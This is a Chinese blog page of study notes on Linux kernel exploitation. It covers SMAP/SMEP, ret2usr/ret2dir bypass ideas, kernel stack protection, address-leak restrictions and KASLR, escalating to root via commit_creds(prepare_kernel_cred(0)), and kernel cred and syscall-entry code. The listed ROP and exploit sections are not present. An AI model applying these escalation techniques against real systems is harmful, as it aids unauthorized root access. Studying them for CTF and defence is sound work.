<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>linux 内核pwn (0) | ScUpax0s</title><meta name="description" content="前置知识内核保护相关SMAP&#x2F;SMEPSMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileg"><meta name="author" content="Paxos"><meta name="copyright" content="Paxos"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="linux 内核pwn (0)"><meta name="twitter:description" content="前置知识内核保护相关SMAP&#x2F;SMEPSMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileg"><meta name="twitter:image" content="https://s1.ax1x.com/2020/07/14/UNnv1P.png"><meta property="og:type" content="article"><meta property="og:title" content="linux 内核pwn (0)"><meta property="og:url" content="http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/"><meta property="og:site_name" content="ScUpax0s"><meta property="og:description" content="前置知识内核保护相关SMAP&#x2F;SMEPSMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileg"><meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNnv1P.png"><meta property="article:published_time" content="2020-07-12T05:31:38.000Z"><meta property="article:modified_time" content="2020-07-14T03:45:45.147Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/"><link rel="prev" title="Linux内核基础学习笔记" href="http://yoursite.com/2020/07/16/Linux%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/"><link rel="next" title="操作系统相关概念整理与复习" href="http://yoursite.com/2020/06/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E6%95%B4%E7%90%86%E4%B8%8E%E5%A4%8D%E4%B9%A0/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/15/N9ZTBV.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">55</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">32</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">12</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前置知识"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#内核保护相关"><span class="toc-number">1.1.</span> <span class="toc-text">内核保护相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMAP-SMEP"><span class="toc-number">1.1.1.</span> <span class="toc-text">SMAP&#x2F;SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-protector"><span class="toc-number">1.1.2.</span> <span class="toc-text">Stack protector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Address-Display-Restriction"><span class="toc-number">1.1.3.</span> <span class="toc-text">Kernel Address Display Restriction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KALSR"><span class="toc-number">1.1.4.</span> <span class="toc-text">KALSR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核提权相关"><span class="toc-number">1.2.</span> <span class="toc-text">内核提权相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方式"><span class="toc-number">1.2.1.</span> <span class="toc-text">方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cred结构体"><span class="toc-number">1.2.2.</span> <span class="toc-text">cred结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#状态切换"><span class="toc-number">1.2.3.</span> <span class="toc-text">状态切换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#user2kernl"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">user2kernl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kernel2user"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">kernel2user</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件结构"><span class="toc-number">2.</span> <span class="toc-text">文件结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#启动之前"><span class="toc-number">3.</span> <span class="toc-text">启动之前</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#首先要对打包后的文件系统进行处理解包"><span class="toc-number">3.1.</span> <span class="toc-text">首先要对打包后的文件系统进行处理解包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看开机自启动脚本-core-etc-init-d"><span class="toc-number">3.2.</span> <span class="toc-text">查看开机自启动脚本 core&#x2F;etc&#x2F;init.d</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop-ko文件"><span class="toc-number">3.3.</span> <span class="toc-text">rop.ko文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP链构造"><span class="toc-number">4.</span> <span class="toc-text">ROP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看kaslr与基地址偏移"><span class="toc-number">4.1.</span> <span class="toc-text">查看kaslr与基地址偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用户态与内核态的切换"><span class="toc-number">4.2.</span> <span class="toc-text">用户态与内核态的切换</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内核态返回用户态："><span class="toc-number">4.2.1.</span> <span class="toc-text">内核态返回用户态：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget-这里真的找了半天"><span class="toc-number">4.3.</span> <span class="toc-text">ROPgadget(这里真的找了半天)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找iretq"><span class="toc-number">4.4.</span> <span class="toc-text">查找iretq</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自己写了一个小sh文件"><span class="toc-number">4.5.</span> <span class="toc-text">自己写了一个小sh文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#向驱动中的函数下断点"><span class="toc-number">4.6.</span> <span class="toc-text">向驱动中的函数下断点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://s1.ax1x.com/2020/07/14/UNnv1P.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ScUpax0s</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">linux 内核pwn (0)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-07-12 13:31:38"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-07-12</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-07-14 11:45:45"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-07-14</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/kernel/">kernel</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>Comments:</span><span class="disqus-comment-count comment-count"><a href="http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/#disqus_thread"></a></span></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="内核保护相关"><a href="#内核保护相关" class="headerlink" title="内核保护相关"></a>内核保护相关</h2><h3 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h3><p><em>SMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。SMEP类似于前面说的NX，不过一个是在内核态中，一个是在用户态中。和NX一样SMAP/SMEP需要处理器支持，可以通过cat /proc/cpuinfo查看，在内核命令行中添加nosmap和nosmep禁用。windows系统从win8开始启用SMEP，windows内核枚举哪些处理器的特性可用，当它看到处理器支持SMEP时通过在CR4寄存器中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址绕过。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。<br>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr。physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址。另一方面，我们知道用户空间的虚拟内存也会映射到RAM。这就存在两个虚拟内存地址(一个在physmap地址，一个在用户空间地址)映射到同一个RAM地址的情况。也就是说，我们在用户空间里创建的数据，代码很有可能映射到physmap空间。基于这个理论在用户空间用mmap()把提权代码映射到内存，然后再在physmap里找到其对应的副本，修改EIP跳到副本执行就可以了。因为physmap本身就是在内核空间里，所以SMAP/SMEP都不会发挥作用。这种漏洞利用方式叫ret2dir。</em><br>简单来讲就是隔离了内核和用户空间，内核没法用用户空间的代码。</p>
<h3 id="Stack-protector"><a href="#Stack-protector" class="headerlink" title="Stack protector"></a>Stack protector</h3><p>类似于用户态的canary？<br><em>当然在内核中也是有这种防护的，编译内核时设置CONFIG_CC_STACKPROTECTOR选项即可，该补丁是Tejun Heo在09年给主线kernel提交的。2.6.24:首次出现该编译选项并实现了x64平台的进程上下文栈保护支持。2.6.30:新增对内核中断上下文的栈保护和对x32平台进程上下文栈保护支持。3.14:对该功能进行了一次升级以支持gcc的-fstack-protector-strong参数，提供更大范围的栈保护关于函数返回地址的问题属于CFI(Control Flow Integrity，控制流完整性保护)中的后向控制流完整性保护。近几年人们提出了safe-stack和shadow-call-stack引入一个专门存储返回地址的栈替代Stack Protector。可以从下图看到shadow-call-stack开销更小一点。这项技术已经应用于android，而linux内核仍然在等待硬件的支持。</em></p>
<h3 id="Kernel-Address-Display-Restriction"><a href="#Kernel-Address-Display-Restriction" class="headerlink" title="Kernel Address Display Restriction"></a>Kernel Address Display Restriction</h3><p>在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。从Ubuntu 11.04和RHEL 7开始，/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。（非root用户不可读取）</p>
<h3 id="KALSR"><a href="#KALSR" class="headerlink" title="KALSR"></a>KALSR</h3><p>内核地址随机化，类似于用户态的alsr，非默认开始</p>
<h2 id="内核提权相关"><a href="#内核提权相关" class="headerlink" title="内核提权相关"></a>内核提权相关</h2><h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><p>一般调用<code>commit_creds(prepare_kernel_cred(0))</code>完成提权然后用户态“着陆”起shell</p>
<h3 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h3><p>kernel用cred结构体记录进程的权限（每个进程中都有一个cred结构），保存了进程权限相关信息（uid、gid），如果能修改这个cred，就完成了提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<h3 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h3><h4 id="user2kernl"><a href="#user2kernl" class="headerlink" title="user2kernl"></a>user2kernl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Interrupts are off on entry.</span></span><br><span class="line"><span class="comment">	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,</span></span><br><span class="line"><span class="comment">	 * it is too small to ever cause noticeable irq latency.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	SWAPGS_UNSAFE_STACK <span class="comment">//swapgs</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A hypervisor implementation might want to use a label</span></span><br><span class="line"><span class="comment">	 * after the swapgs, so that it can do the swapgs</span></span><br><span class="line"><span class="comment">	 * for the guest and jump here on syscall.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">GLOBAL(entry_SYSCALL_64_after_swapgs)</span><br><span class="line"></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">	TRACE_IRQS_OFF</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS			<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	<span class="function">pushq	<span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>	<span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line">	pushq	%r11				/* pt_regs-&gt;flags */</span><br><span class="line">	pushq	$__USER_CS			<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx				<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">	pushq	%rax				<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">	pushq	%rdi				<span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">	pushq	%rsi				<span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">	pushq	%rdx				<span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">	pushq	%rcx				<span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">	pushq	$-ENOSYS			<span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">	pushq	%r8				<span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">	pushq	%r9				<span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">	pushq	%r10				<span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">	pushq	%r11				<span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">	sub	$(<span class="number">6</span>*<span class="number">8</span>), %rsp			<span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we need to do entry work or if we guess we'll need to do</span></span><br><span class="line"><span class="comment">	 * exit work, go straight to the slow path.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	PER_CPU_VAR(current_task), %r11</span><br><span class="line">	testl	$_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)</span><br><span class="line">	jnz	entry_SYSCALL64_slow_path</span><br></pre></td></tr></table></figure>

<ul>
<li>1.swapgs切换到kernel GS<br>2.保存栈值，设置内核栈<code>#define PER_CPU_VAR(var)    %__percpu_seg:var</code>其中%__percpu_seg是GS</li>
</ul>
<p>3.压栈保存寄存器<br>4.判断类型<br>5.通过系统调用号跳转</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL64_slow_path:</span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	SAVE_EXTRA_REGS</span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br></pre></td></tr></table></figure>
